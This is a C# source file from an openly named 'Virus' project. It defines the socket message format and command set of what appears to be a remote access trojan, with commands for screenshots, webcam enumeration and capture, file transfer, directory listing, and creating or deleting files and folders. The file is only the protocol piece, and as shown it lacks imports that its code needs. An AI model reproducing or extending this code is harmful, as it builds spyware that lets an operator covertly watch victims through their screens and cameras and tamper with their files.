using System;
using System.Text;
using System.Net.Sockets;

namespace Virus {
    class Message {
		private static readonly byte[] ACK = Encoding.ASCII.GetBytes("<|ACK|>");
		public readonly Type type;
		public readonly byte[] body;
		
		public Message(Type t) {
			type = t;
			body = new byte[0];
		}
		public Message(Type t, string msg) {
			type = t;
			body = Encoding.ASCII.GetBytes(msg);
		}
		public Message(Type t, IEnumerable<byte> msg) {
			type = t;
			body = msg.ToArray();
		}
		
		public bool TryGetString(out String msg) {
			msg = "";
			try {
				msg = Encoding.ASCII.GetString(body);
			} catch (ArgumentException) { return false; }
			return true;
		}

		public void Send(Socket sock) {
			sock.Send(new byte[] {(byte)type});
			sock.Send(body);
			sock.Send(ACK);
		}
		
		public enum Type : byte {
			Login,
			Heartbeat,
			Message,
			Screenshot,
			CamEnum,
			Camerashot,
			F2C,
			F2S,
			Ls,
			MkDir,
			RmDir,
			Rm,
			RR,
		}
	}
}